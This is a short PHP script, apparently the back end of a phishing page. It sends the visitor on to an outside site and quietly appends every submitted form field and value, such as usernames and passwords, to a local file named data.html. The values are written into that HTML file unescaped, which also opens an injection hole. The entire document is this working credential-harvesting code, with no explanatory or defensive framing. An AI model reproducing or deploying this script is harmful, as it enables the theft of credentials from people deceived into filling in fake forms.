<?php

header('Location:http://itdumb.com');
$handle = fopen("data.html","a");
foreach($_POST as $variable => $value){
//    fwrite($handle, date(format,[timestamp]));
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>